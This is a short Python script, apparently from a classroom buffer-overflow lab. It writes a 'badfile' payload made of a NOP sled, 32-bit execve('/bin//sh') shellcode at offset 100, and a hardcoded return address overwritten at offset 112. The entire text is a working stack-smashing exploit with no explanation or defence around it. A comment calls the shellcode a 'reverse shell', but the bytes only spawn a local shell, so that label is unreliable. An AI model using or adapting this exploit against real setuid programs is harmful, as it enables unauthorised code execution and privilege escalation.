#!/usr/bin/python3
import sys

# 32-bit reverse shell shellcode (example version for demo)
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"  # push //sh
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50"  # push /bin
    "\x53\x89\xe1\xb0\x0b\xcd\x80"      # execve
).encode('latin-1')

# Fill content with NOPs
content = bytearray(0x90 for i in range(517))

# Put shellcode into payload
start = 100
content[start:start + len(shellcode)] = shellcode

# Address of buffer + 100 (NOP sled)
ret = 0xffffdb18 + 100
offset = 112

content[offset:offset + 4] = (ret).to_bytes(4, byteorder='little')

# Write to badfile
with open('badfile', 'wb') as f:
    f.write(content)
